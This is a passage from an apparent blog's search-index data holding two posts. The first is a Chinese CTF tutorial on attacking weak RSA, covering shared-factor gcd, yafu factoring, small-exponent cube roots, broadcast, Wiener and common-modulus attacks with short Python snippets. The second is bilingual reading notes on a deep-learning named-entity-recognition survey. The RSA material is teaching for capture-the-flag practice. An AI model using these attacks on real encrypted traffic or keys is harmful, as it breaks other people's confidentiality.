= pq_1$$n2 = pq_2$ 直接分解成功。而欧几里得算法的时间复杂度为：O(log n)。这个时间复杂度即便是4096 bit也是秒破级别。 12345678def gcd(a, b): if a &lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return a 题目识别 识别此类题目，通常会发现题目给了若干个n，均不相同，并且都是2048bit，4096bit级别，无法正面硬杠，并且明文都没什么联系，e也一般取65537。 例题 在一个题目中，你拿到了两个n，e都为65537，两个n分别为： 12n1=9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327n2=13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743 通过直接分解，上factordb都分解失败。通过尝试发现： 1print gcd(n1,n2) 打印出： 11564859779720039565508870182569324208117555667917997801104862601098933699462849007879184203051278194180664616470669559575370868384820368930104560074538872199213236203822337186927275879139590248731148622362880471439310489228147093224418374555428793546002109 则此致即为两个n共有的素因子p，然后进一步求出q，求解完毕。 Fermat方法与Pollard rho方法针对大整数的分解有很多种算法，性能上各有优异，有Fermat方法，Pollard rho方法，试除法，以及椭圆曲线法，连分数法，二次筛选法，数域分析法等等。其中一些方法应用在RSA的攻击上也有奇效。 在p，q的取值差异过大，或者p，q的取值过于相近的时候，Format方法与Pollard rho方法都可以很快将n分解成功。 此类分解方法有一个开源项目yafu将其自动化实现了，不论n的大小，只要p和q存在相差过大或者过近时，都可以通过yafu很快地分解成功。 题目识别 在直接分解n无望，不能利用公约数分解n之后，都应该使用yafu去试一下。 例题 https://www.jarvisoj.com (Medium RSA) 此题首先从pem中提取N和e，然后上yafu，直接分解成功。 低加密指数攻击在RSA中e也称为加密指数。由于e是可以随意选取的，选取小一点的e可以缩短加密时间，但是选取不当的话，就会造成安全问题。 e=3时的小明文攻击当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。 即： $c = m^e mod φ(n)$ 如果e=3，且 m^e &lt; n，那么： $c = m^e$$e = 3$$m = \\sqrt{3} c$ 如果明文的三次方比n大，但是不是足够大，那么设k，有： $c = m^e+kn$ 爆破k，如果$c-kn$能开三次根式，那么可以直接得到明文。 题目识别 在e=3的时候首先尝试这种方法 例题 https://www.jarvisoj.com (Extremely hard RSA) 关键代码如下：此题通过不断给明文+n开三次方即可求得： 123456i=0 while 1: if(gmpy.root(c+i*N, 3)[1]==1): print gmpy.root(c+i*N, 3) break i=i+1 低加密指数广播攻击如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。 即，选取了相同的加密指数e（这里取e=3），对相同的明文m进行了加密并进行了消息的传递，那么有： $ c_1 = m^e$ $mod$ $n_1$ $c_2 = m^e$ $mod$ $n_2$ $ c_3 = m^e$ $mod$ $n_3$ 对上述等式运用中国剩余定理，在e=3时，可以得到： $ c_x = m^3$ $mod$ $n_1n_2n_3$ 通过对$ c_x $进行三次开方可以求得明文。 题目识别 一般来说都是给了三组加密的参数和明密文，其中题目很明确地能告诉你这三组的明文都是一样的，并且e都取了一个较小的数字。 例题： SCTF2016，CODE300 题目第二轮中通过流量包的方式给了广播攻击的参数。 直接给国外类似一题的网址：http://codezen.fr/2014/01/16/hackyou-2014-crypto-400-cryptonet Coppersmith定理攻击Coppersmith定理指出在一个e阶的mod n多项式f(x)中，如果有一个根小于，就可以运用一个O(log n)的算法求出这些根。 Coppersmith定理指出在一个e阶的mod n多项式f(x)中，如果有一个根小于$ n^frac{1}{e} $，就可以运用一个O(log n)的算法求出这些根。 这个定理可以应用于RSA算法。如果e = 3并且在明文当中只有三分之二的比特是已知的，这种算法可以求出明文中所有的比特。 并未找到真题。 低解密指数攻击与低加密指数相同，低解密指数可以加快解密的过程，但是者也带来了安全问题。 那么一种基于连分数(一个数论当中的问题)的特殊攻击类型就可以危害RSA的安全。此时需要满足： $q&lt;$$p$$&lt;2q$ 如果满足上述条件，通过Wiener Attack可以在多项式时间中分解n。 rsa-wiener-attack的攻击源码开源在了github中，采取python编写，可以很容易使用。 题目识别 e看起来很大就行了。 例题 直接github用工具就行。https://github.com/pablocelayes/rsa-wiener-attack 这里注意一个细节问题，如果在运行脚本的时候报错，请在脚本前加上： 12import syssys.setrecursionlimit(10000000) 共模攻击如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n的情况下还原出明文m的值。即： ​ $ c_1=m^{e_1}$ $mod$ $n$ ​ $ c_2=m^{e_2}$ $mod$ $n$ 即存在$ s_2 $，$ s_2 $使得： s1^e1 + s2^e2 = 1 又因为 $ c_1= m^{e_1}$ $mod$ $n$ $ c_2 = m^{e_2}$ $mod$ $n$ 明文解出。 题目识别 非常简单，若干次加密，每次n都一样，明文根据题意也一样即可。 例题 https://www.jarvisoj.com (very hard RSA) 如果已知：n1，n2，c1，c2，e1，e2，并且其中n1=n2的话： 123456789101112s = egcd(e1, e2) s1 = s[1] s2 = s[2] print s n=n1 if s1&lt;0: s1 = - s1 c1 = modinv(c1, n) elif s2&lt;0: s2 = - s2 c2 = modinv(c2, n) m=(pow(c1,s1,n)*pow(c2,s2,n)) % n","link":"/2018/05/09/RSA-in-ctf/"},{"title":"NER-survey-notes","text":"Reading Notes: A Survey on Deep Learning for Named Entity RecognitionSource：《A Survey on Deep Learning for Named Entity Recognition》 #0x01 Abstract Named entity recognition (NER) is the task to identify text spans that mention named entities, and to classify them into predefined categories such as person, location, organization etc. NER serves as the basis for a variety of natural language applications such as question answering, text summarization, and machine translation. 命名实体识别(NER)旨在从文本中识别出特殊对象，这些对象的语义类别通常在识别前被预定义好，预定义类别如人、地址、组织等。命名实体识别不仅仅是独立的信息抽取任务，它在许多大型自然语言处理应用系统如信息检索、自动文本概要、问答任务、机器翻译以及知识建库（知识图谱）中也扮演了关键的角色。 This paper introduced four aspects of the NER: Introduced NER resources, including tagged NER corpora and off-the-shelf NER tools. Systematically categorized existing works based on a taxonomy along three axes: distributed representations for input, context encoder, and tag decoder. The most representative methods for recent applied techniques of deep learning in new NER problem settings and applications. The challenges faced by NER systems and outline future directions in this area. 这篇文章主要介绍了NER的四个方面 介绍了NER的资源，包括标签化的NER词库和现成的NER工具 基于分类法从三个角度对现有的工作进行系统的分类：输入的分布式表示，内容编码器，标签解码器 深度学习的最新应用技术在新的NER问题设置和应用中的最具代表性的方法 NER系统所面临的挑战以及在这一领域的未来发展方向。 0x02 IntroNamed entity The author divides named entities into two categories： generic named entities，such as people and places. specific domain named entities，such as proteins，genes. This paper focuses on the first type of named entity recognition task in English. 作者讲命名实体分为两类： 常见的命名实体，如人名和地名 特殊领域的命名实体，如蛋白质、基因 这篇文章主要聚焦于英文的第一类命名实体识别的任务。 Methods for NER Rule-based approaches, which do not need annotated data as they rely on hand-crafted rules Unsupervised learning approaches, which rely on un-supervised algorithms without hand-labeled training examples Feature-based supervised learning approaches, which rely on supervised learning algorithms with careful feature engineering Deep-learning based approaches, which automatically discover representations needed for the classification and/or detection from raw input in an end-to-end manner. 基于规则的方法 无监督方法 基于特征的监督学习方法 深度学习方法 上述分类法并非泾渭分明的，比如某些深度学习方法也结合了一些研究者设计的特征来提高识别的准确率。 Formalize Definition Given a sequence of tokens $s=&lt;w_1,w_2,…,w_n&gt;$, NER is to output a list of tuples $&lt;I_s,I_e,t&gt;$, each of which is a named entity mentioned in $s$. Here, $I_s\\in[1,N]$ and $I_e\\in[1,N]$ are the start and the end indexes of a named entity mention; $t$ is the entity type from a predefined category set. Example as: 给定标识符集合 $s=&lt;w_1,w_2,…,w_n&gt;$ ，NER 输出一个三元组的 $&lt;I_s,I_e,t&gt;$ 列表，列表中的每个三元组代表 $s$ 中的一个命名实体。此处 $I_s\\in[1,N]$，$I_e\\in[1,N]$ 分别为命名实体的起始索引以及结束索引；$t$ 指代从预定义类别中选择的实体类型 ##Tasks of NER Coarse-grained NER: focuses on a small set of coarse entity types and one type per named entity Fine-grained NER: focus on a much larger set of entity types where a mention may be assigned multiple types NOTE: The change of NER task from coarse to fine is closely related to the development of annotated data sets from small to large 粗粒度的NER（实体种类少，每个命名实体对应一个实体类型） 细粒度的NER（实体种类多，每个命名实体可能存在多个对应的实体类型） 值得一提的是，NER任务从粗到细的变化与标注数据集从小到大的发展密切相关 ##NER Resources Datasets High quality annotation are critical for both model learning and evaluation. Before 2005, datasets were mainly developed by annotating news articles with a small number of entity types, suitable for coarse-grained NER tasks. After that, more datasets were developed on various kinds of text sources including Wikipedia articles, conversation, and user-generated text(e.g., tweets and YouTube comments and StackExchange posts in W-NUT). The number of tag types becomes significantly larger, e.g., 89 in OntoNotes. Note that many recent NER works report their perfor-mance on CoNLL03 and OntoNotes datasets, they are used for coarse-grained and fine-grained NER tasks, respectively. 有监督方法的NER任务依赖标注数据集。2005 年之前，数据集主要通过标注新闻文章得到并且预定义的实体种类少，这些数据集适合用于粗粒度的NER任务; 2005 年之后，数据集来源越来越多，包括但不限于维基百科文章、对话、用户生成语料（如推特等社区的用户留言）等，并且预定义的实体类别也多了许多，以数据集 OneNotes 为例，其预定义的实体类别达到了89种之多。 所有数据集中，最常见的数据集为 CoNLL03 和 OneNotes，分别常见于粗粒度的NER任务和细粒度的NER任务。 Corpus Year Text Source #Tags URL MUC-6 1995 Wall Street Journal texts 7 https://catalog.ldc.upenn.edu/LDC2003T13 MUC-6 Plus 1995 Additional news to MUC-6 7 https://catalog.ldc.upenn.edu/LDC96T10 MUC-7 1997 New York Times news 7 https://catalog.ldc.upenn.edu/LDC2001T02 CoNLL03 2003 Reuters news 4 https://www.clips.uantwerpen.be/conll2003/ner/ ACE 2000-2008 Transcripts, news 7 https://www.ldc.upenn.edu/collaborations/past-projects/ace OntoNotes 2007-2012 Magazine, news, conversation, web 89 https://catalog.ldc.upenn.edu/LDC2013T19 W-NUT 2015-2018 User-generated text 18 http://noisy-text.github.io/ BBN 2005 Wall Street Journal texts 64 https://catalog.ldc.upenn.edu/ldc2005t33 NYT 2008 New Yorks Times texts 5 https://catalog.ldc.upenn.edu/LDC2008T19 WikiGold 2009 Wikipedia 4 https://figshare.com/articles/Learning_multilingual_named_entity_recognition_from_Wikipedia/546250 WiNER 2012 Wikipedia 4 http://rali.iro.umontreal.ca/rali/en/winer-wikipedia-for-ner WikiFiger 2012 Wikipedia 113 https://github.com/xiaoling/figer N3 2014 News 3 http://aksw.org/Projects/N3NERNEDNIF.html GENIA 2004 Biology and clinical texts 36 http://www.geniaproject.org/home GENETAG 2005 MEDLINE 2 https://sourceforge.net/projects/bioc/files/ FSU-PRGE 2010 PubMed and MEDLINE 5 https://julielab.de/Resources/FSU_PRGE.html NCBI-Disease 2014 PubMed 790 https://www.ncbi.nlm.nih.gov/CBBresearch/Dogan/DISEASE/ BC5CDR 2015 PubMed 3 http://bioc.sourceforge.net/ DFKI 2018 Bussiness news and social media 7 https://dfki-lt-re-group.bitbucket.io/product-corpus/ Tools Off-the-shelf NER tools offered by academia and industry/open source projects. 现成的NER工具来源于学界、工业界以及开源项目 NER System URL StanfordCoreNLP https://stanfordnlp.github.io/CoreNLP/ OSU Twitter NLP https://github.com/aritter/twitter_nlp Illinois NLP http://cogcomp.org/page/software/ NeuroNER http://neuroner.com/ NERsuite http://nersuite.nlplab.org/ Polyglot https://polyglot.readthedocs.io/ Gimli http://bioinformatics.ua.pt/gimli spaCy https://spacy.io/ NLTK https://www.nltk.org/ OpenNLP https://opennlp.apache.org/ LingPipe http://alias-i.com/lingpipe-3.9.3/ AllenNLP https://allennlp.org/models IBM Watson https://www.ibm.com/watson/ 0x03 Evaluation Metrics NER systems are usually evaluated by comparing their outputs against human annotations. The comparison can be quantified by Exact-match Relaxed match 通常通过与人类标注水平进行比较判断NER系统的优劣。评估分两种： 精确匹配评估 宽松匹配评估 Exact-match Evaluation NER involves identifying both entity boundaries and entity types. With “exact-match evaluation”, a named entity is considered correctly recognized only if its both boundaries and type match ground truth. Precision, Recall, and F-score are computed on the number of true positives(TP), false positives(FP), and false negatives(FN). True Positive(TP): entities that are recognized by NER and match ground truth. False Positive(FP): entities that are recognized by NER but do not match ground truth. False Negative(FN): entities annotated in the ground truth that are not recognized by NER. NER任务需要同时确定实体边界以及实体类别。在精确匹配评估中，只有当实体边界以及实体类别同时被精确标出时，实体识别任务才能被认定为成功。基于数据的 true positives（TP），false positives（FP），以及false negatives（FN），可以计算NER任务的精确率，召回率以及 F-score 用于评估任务优劣。对NER中的 true positives（TP），false positives（FP）与false negatives（FN）有如下解释： true positives（TP）：NER能正确识别实体 false positives（FP）：NER能识别出实体但类别或边界判定出现错误 false negatives（FN）：应该但没有被NER所识别的实体 Precision measures the ability of a NER system to present only correct entities, and Recall measures the ability of a NER system to recognize all entities in a corpus. $$Precision = \\dfrac{TP}{TP+FP}$$ $$Recall=\\dfrac{TP}{TP+FN}$$ F-score is the harmonic mean of precision and recall, and the balanced F-score is most commonly used: $$F-score=2\\times\\dfrac{Precision\\times Recall}{Precision+Recall}$$ As most of NER systems involve multiple entity types, it is often required to assess the performance across all entity classes. Two measures are commonly used for this purpose: Macro-averaged F-score Computes the F-score independently for each entity type, then takes the average(hence treating all entity types equally). Micro-averaged F-score Aggregates the contributions of entities from all classes to compute the average(treating all entities equally). 绝大多数的NER任务需要识别多种实体类别，需要对所有的实体类别评估NER的效果。基于这个思路，有两类评估指标： 宏平均 F-score（macro-averaged F-score）：分别对每种实体类别分别计算对应类别的 F-score，再求整体的平均值（将所有的实体类别都视为平等的） 微平均 F-score（micro-averaged F-score）：对整体数据求 F-score（将每个实体个体视为平等的） Relaxed-match Evaluation MUC-6 defines a relaxed-match evaluation: a correct type is credited if an entity is assigned its correct type regardless its boundaries as long as there is an overlap with ground truth boundaries; a correct boundary is credited regardless an entity’s type assignment. Thus, complex evaluation methods are not widely used in recent NER studies. MUC-6 定义了一种宽松匹配评估标准：只要实体的边界与实体真正所在的位置有重合（overlap）且实体类别识别无误，就可以认定实体类别识别正确；对实体边界的识别也不用考虑实体类别识别的正确与否。与精确匹配评估相比，宽松匹配评估的应用较少。 0x04 Traditional Approaches to NERRule-based Approaches Rule-based NER systems rely on hand-crafted rules. Rules can be designed based on domain-specific gaztteers, and syntactic-lexical patterns. These systems are mainly based on hand-crafted semantic and syntactic rules to recognize entities. Rule-based systems work very well when lexicon is exhaustive. Due to domain-specific rules and incomplete dictionaries, high precision and low recall are often observed from such systems, and the systems can not be transferred to other domains. 基于规则的NER系统依赖于人工制定的规则。规则的设计一般基于句法、语法、词汇的模式以及特定领域的知识等。当字典大小有限时，基于规则的NER系统可以达到很好的效果。由于特定领域的规则以及不完全的字典，这种NER系统的特点是高精确率与低召回率，并且类似的系统难以迁移应用到别的领域中去：基于领域的规则往往不通用，对新的领域而言，需要重新制定规则且不同领域字典不同。 Unsupervised Learning Approaches A typical approach of unsupervised learning is clustering. Clustering-based NER systems extract named entities from the clustered groups based on context similarity. The key idea is that lexical resources, lexical patterns, and statistics computed on a large corpus can be used to infer mentions of named entities. 典型的无监督方法如聚类可以利用语义相似性，从聚集的组中抽取命名实体。其核心思路在于利用基于巨大语料得到的词汇资源、词汇模型、统计数据来推断命名实体的类别。 ##Feature-based Supervised Learning Approaches Applying supervised learning, NER is cast to a multi-class classification or sequence labeling task. Given annotated data samples, features are carefully designed to represent each training example. Machine learning algorithms are then utilized to learn a model to recognize similar patterns from unseen data. 利用监督学习，NER任务可以被转化为多分类任务或者序列标注任务。根据标注好的数据，研究者应用领域知识与工程技巧设计复杂的特征来表征每个训练样本，然后应用机器学习算法，训练模型使其对数据的模式进行学习。 0x05 Deep learning Techniques for NERWhy Deep Learning for NER? There are three core strengths of applying deep learning techniques to NER: NER benefits from the non-linear transformation, which generates non-linear mappings from input to output. Compared with linear models(e.g., loglinear HMM and linear chain CRF), deep-learning models are able to learn complex and intricate features from data via non-linear activation functions. Deep learning saves significant effort on designing NER features. The traditional feature-based approaches require considerable amount of engineering skill and domain expertise. Deep learning models are effective in automatically learning useful representations and underlying factors from raw data. Deep neural NER models can be trained in an end-to-end paradigm, by gradient descent. This property enables us to design possibly complex NER systems 三个主要的优势： NER可以利用深度学习非线性的特点，从输入到输出建立非线性的映射。相比于线性模型（如线性链式CRF、log-linear隐马尔可夫模型），深度学习模型可以利用巨量数据通过非线性激活函数学习得到更加复杂精致的特征。 深度学习不需要过于复杂的特征工程。传统的基于特征的方法需要大量的工程技巧与领域知识；而深度学习方法可以从输入中自动发掘信息以及学习信息的表示，而且通常这种自动学习并不意味着更差的结果。 深度NER模型是端到端的；端到端模型的一个好处在于可以避免流水线（pipeline）类模型中模块之间的误差传播；另一点是端到端的模型可以承载更加复杂的内部设计，最终产出更好的结果。 Taxonomy The taxonomy of DL-based NER. FRO input sequence to predicted tags, a DL-based NER model consists of: Distributed representations for input Context encoder Tag decoder 文章针对现有的深度NER模型提出了一种新的归纳方法。这种归纳法将深度NER系统概括性的分为了三个阶段： 输入的分布式表示（distributed representation） 语境语义编码（context encoder） 标签解码（tag decoder） 一个深度NER系统的结构示例如下： #0x06 Distributed Representations for Input A straight forward option of representing a word is one-hot vector representation. In one-hot vector space, two distinct words have completely different representations and are orthogonal. Distributed representation represents words in low dimensional real-valued dense vectors where each dimension represents a latent feature. Automatically learned from text, distributed representation captures semantic and syntactic properties of word, which do not explicitly present in the input to NER. Three types of distributed representations that have been used in NER models: Word-level Representation CBOW, continuous bag-of-words continuous skip-gram model Character-level Representation Hybrid Representation 分布式语义表示：一个单词的含义是由这个单词常出现的语境（上下文）所决定的 一种直接粗暴的单词表示方法为 one-hot 向量表示。这种方法通常向量的维度太大，极度稀疏，且任何两个向量都是正交的，无法用于计算单词相似度。分布式表示使用低维度稠密实值向量表示单词，其中每个维度表示一个隐特征（此类特征由模型自动学习得到，而非人为明确指定，研究者往往不知道这些维度到底代表的是什么具体的特征）。这些分布式表示可以自动地从输入文本中学习得到重要的信息。深度NER模型主要用到了三类分布式表示： 单词级别表示 字符级别表示 混合表示 ##Word-level Representation Usually, each word can be represented by a low-dimensional real value vector after training. Using as the input, the pre-trained word embeddings can be either fixed or further fine-tuned during NER model training. 通常经过训练，每个单词可以用一个低维度的实值向量表示。 作为后续阶段的输入，这些词嵌入向量既可以在预训练之后就固定，也可以根据具体应用场景进行调整。 Commonly used word embeddings include: Google Word2Vec Stanford GloVe Facebook fastText SENNA Examples: Joint Extraction of Entities and Relations Based on a Novel Tagging Scheme use Word2Vec for end-to-end joint extraction model learning to obtain word representations as model input Fast and accurate entity recognition with iterated dilated convolutions The lookup table in their model are initialized by 100-dimensional embeddings trained on SENNA corpus by skip-n-gram. Character-level Representation Character-level representation has been found useful for exploiting explicit sub-word-level information such as prefix and suffix. Another advantage of character-level representation is that it naturally handles out-of-vocabulary. Thus character-based model is able to infer representations for unseen words and share information of morpheme-level regularities. 字符级别的表示能更有效地利用次词级别信息如前缀、后缀等。其另一个好处在于它可以很好地处理 out-of-vocabulary 问题。字符级别的表示可以对没有见过的（训练语料中未曾出现的）单词进行合理推断并给出相应的表示，并在语素层面上共享、处理信息（语素：最小的的音义结合体）。主流的抽取字符级别表示的结构分为： There are two widely-used architectures for extracting character-level representation: CNN-based RNN-based Figures below illustrate the two architectures: Examples: CNN-based：Deep contextualized word representations(ELMo) RNN-based：CharNER Hybrid Representation Some studies also incorporate additional information(e.g., gazetteers and lexical similarity) into the final representations of words, before feeding into context encoding layers. In other words, the DL-based representation is combined with feature-based approach in a hybrid manner. Adding additional information may lead to improvements in NER performance, with the price of hurting generality of these systems. 某些单词表示研究还结合了一些其他信息，例如句法信息、词法信息、领域信息等。这些研究将这些附加的信息与单词表示或字符级别的表示相结合作为最终的单词表示，之后再作为输入输入到后续的语义编码结构当中。换而言之，这种方法的本质是将基于深度学习的单词表示与基于特征的方法相结合。这些额外的信息可能可以提升NER系统的性能，但是代价是可能会降低系统的通用性与可迁移性。 Examples: BERT #0x07 Context Encoder The second stage of DL-based NER is to learn context encoder from the input representations. The widely-used context encoder architectures are: Convolutional Neural Networks, CNN Recurrent Neural Networks, RNN Recursive Neural Networks Neural Language Models Deep Transformer Convolutional Neural NetworksCollobert et al. proposed a sentence approach network where a word is tagged with the consideration of whole sentence: Each word in the input sequence is embedded to an N-dimensional vector after the stage of input representation. Then a convolutional layer is used to produce local features around each word, and the size of the output of the convolutional layers depends on the number of words in the sentence. The global feature vector is constructed by combining local feature vectors extracted by the convolutional layers. The dimension of the global feature vector is fixed, independent of the sentence length, in order to apply subsequent standard affine layers. Two approaches are widely used to extract global features: a max or an averaging operation over the position(i.e., “time” step) in the sentence. Finally, these fixed-size global features are fed into tag decoder to compute distribution scores for all possible tags for the words in the network input. 输入表示阶段，输入序列中的每一个词都被嵌入一个 N 维的向量。在这之后，系统利用卷积神经网络来产生词间的局部特征，并且此时卷积神经网络的输出大小还与输入句子的大小有关。随后，通过对该局部特征施加极大池化（max pooling）或者平均池化（average pooling）操作，我们能得到大小固定且与输入相互独立的全局特征向量。这些长度大小固定的全局特征向量之后将会被导入标签解码结构中，分别对所有可能的标签计算相应的置信分数，完成对标签的预测。 Recurrent Neural Networks Recurrent neural networks have demonstrated remarkable achievements in modeling sequential data, together with its variants such as: Gated Recurrent Unit, GRU Long-short Term Memory, LSTM In particular, bidirectional RNNs efficiently make use of past information(via forward states) and future information(via backward states) for a specific time frame. Thus, a token encoded by a bidirectional RNN will contain evidence from the whole input sentence. Bidirectional RNNs therefore become de facto standard for composing deep context-dependent representations of text. 循环神经网络在处理序列输入时效果优秀，它有两个最常见的变种： GRU（gated recurrent unit） LSTM（long-short term memory） 特别的，双向循环神经网络（bidirectional RNNs）能同时有效地利用过去的信息和未来的信息，即可以有效利用全局信息。因此，双向循环神经网络逐渐成为解决 NER 这类序列标注任务的标准解法。 Example: Bidirectional lstm-crf models for sequence tagging is among the first to utilize a bidirectional LSTM CRF architecture to sequence tagging tasks (POS, chunking and NER). Recursive Neural Networks Recursive neural networks are non-linear adaptive models that are able to learn deep structured information, by traversing a given structure in topological order. Named entities are highly related to linguistic constituents, e.g., noun phrases. Typical sequential labeling approaches take little into consideration about phrase structures of sentences, however, recursive neural network can effectively use the structural information to obtain better prediction results. 递归神经网络是一种非线性自适应的模型，它可以学习得到输入的深度结构化信息。命名实体与某些语言成分联系十分紧密，如名词词组。传统的序列标注方法几乎忽略了句子的结构信息（成分间的结构），而递归神经网络能有效的利用这样的结构信息，从而得出更好的预测结果。 Typical application: Leveraging linguistic structures for named entity recognition with bidirectional recursive neural networks Neural Language ModelLanguage model is a family of models describing the generation of sequences. Given a token sequence, $(t_1,t_2,…,t_N)$, a forward language model computes the probability of sequence by modeling the probability of token $t_k$ given its history $t_1,…,t_{k-1}$:$$p(t_1,t_2,…,t_N)=\\prod_{k=1}^Np(t_k|t_1,t_2,…,t_{k-1})$$A backward language model is similar to a forward language model, except it runs over the sequence in reverse order, predicting the previous token given its future context:$$p(t_1,t_2,…,t_N)=\\prod_{k=1}^Np(t_k|t_{k+1},t_{k+2},…,t_N)$$For neural language models, probability of token $t_k$ can be computed by the output of recurrent neural networks. At each position $k$, we can obtain two context-dependent representations (forward and backward) and then combine them as the final language model embedding for token $t_k$. Such language-model-augmented knowledge has been empirically verified to be helpful in numerous sequence labeling tasks. Typical application: Semi-supervised sequence tagging with bidirectional language models 文章认为，利用单词级别表示作为输入来产生上下文表示的循环神经网络往往是在相对较小的标注数据集上训练的。而神经语言模型可以在大型的无标注数据集上训练。文中模型同时使用词嵌入模型与神经语言模型对无监督的语料进行训练，得到两种单词表示；之后模型中省去了将输入向量转化为上下文相关向量的操作，直接结合前面得到的两类单词表示并用于有监督的序列标注任务，简化了模型的结构。 Deep TransfomerExamples: Attention is all you need Bert: Pretraining of deep bidirectional transformers for language understanding 0x08 Tag Decoder Tag decoder is the final stage in a NER model. It takes context-dependent representations as input and produce a sequence of tags corresponding to input sequence. The paper summarizes four architectures of tag decoder: 标签解码是NER模型中的最后一个阶段。在得到了单词的向量表示并将它们转化为上下文相关的表示之后，标签解码模块以它们作为输入并对整个模型的输入预测相应的标签序列。主流的标签解码结构分为四类： Multi-Layer Perceptron(MLP) + Softmax Conditional Random Fields, CRFs Recurrent Neural Networks Pointer Networks Multi-Layer Perceptron + Softmax With a multi-layer Perceptron + Softmax layer as the tag decoder layer, the sequence labeling task is cast as a multi-class classification problem. Tag for each word is independently predicted based on the context-dependent representations without taking into account its neighbors. 利用这个结构可以将NER这类序列标注模型视为多类型分类问题。基于该阶段输入的上下文语义表示，每个单词的标签被独立地预测，与其邻居无关。 Typical application: Fast and accurate entity recognition with iterated dilated convolutions Leveraging linguistic structures for named entity recognition with bidirectional recursive neural networks Conditional Random Fields A conditional random field(CRF) is a random field globally conditioned on the observation sequence. CRFs have been widely used in feature-based supervised learning approaches. Many deep learning based NER models use a CRF layer as the tag decoder. 条件随机场（conditional random fields）是一类概率图模型，在基于特征的有监督方法中应用广泛，近来的许多深度学习方法也使用条件随机场作为最后的标签标注结构。 CRFs, however, cannot make full use of segment-level information because the inner properties of segments cannot be fully encoded with word-level representations. 然而，CRFs不能充分利用段级信息，因为段的内部属性不能完全用字级表示进行编码。 Example: Bidirectional lstm-crf models for sequence tagging Recurrent Neural Networks A few studies have explored RNN to decode tags. Deep active learning for named entity recognition reported that RNN tag decoders outperform CRF and are faster to train when the number of entity types is large 一些研究使用 RNN 来预测标签。 Deep active learning for named entity recognition这篇文章中提到，RNN 模型作为预测标签的解码器性能优于 CRF，并且当实体类型很多的时候训练速度更快 Point Networks Pointer networks apply RNNs to learn the conditional probability of an output sequence with elements that are discrete tokens corresponding to the positions in an input sequence. It represents variable length dictionaries by using a softmax probability distribution as a “pointer”. Pointer Networks first applied pointer networks to produce sequence tag Neural Models for Sequence Chunking first identify a chunk (or a segment), and then label it. This operation is repeated until all the words in input sequence are processed 指针网络应用RNNs来学习输出序列的条件概率，其中输出序列中的元素是与输入序列中的位置相对应的离散标记。它使用softmax概率分布作为一个“指针”来表示可变长度字典 Pointer Networks 首次提出此种结构 Neural Models for Sequence Chunking 第一篇将pointer networks结构应用到生成序列标签任务中的文章","link":"/2020/02/23/NER-survey-notes/"}],"tags":[{"name":"Sql injection","slug":"Sql-injection","link":"/tags/Sql-injection/"},{"name":"getshell","slug":"getshell","link":"/tags/getshell/"},{"name":"shadowsocks","slug":"shadowsocks","link":"/tags/shadowsocks/"},{"name":"sqlmap","slug":"sqlmap","link":"/tags/sqlmap/"},{"name":"Word2vec","slug":"Word2vec","link":"/tags/Word2vec/"},{"name":"Webshell","slug":"Webshell","link":"/tags/Webshell/"},{"name":"N-Gram","slug":"N-Gram","link":"/tags/N-Gram/"},{"name":"Wifi","slug":"Wifi","link":"/tags/Wifi/"},{"name":"CVE","slug":"CVE","link":"/tags/CVE/"},{"name":"RSA","slug":"RSA","link":"/tags/RSA/"}],"categories":[{"name":"hack","slug":"hack","link":"/categories/hack/"},{"name":"Tutorial","slug":"Tutorial","link":"/categories/Tutorial/"},{"name":"NLP","slug":"NLP","link":"/categories/NLP/"},{"name":"CTF","slug":"CTF","link":"/categories/CTF/"}]}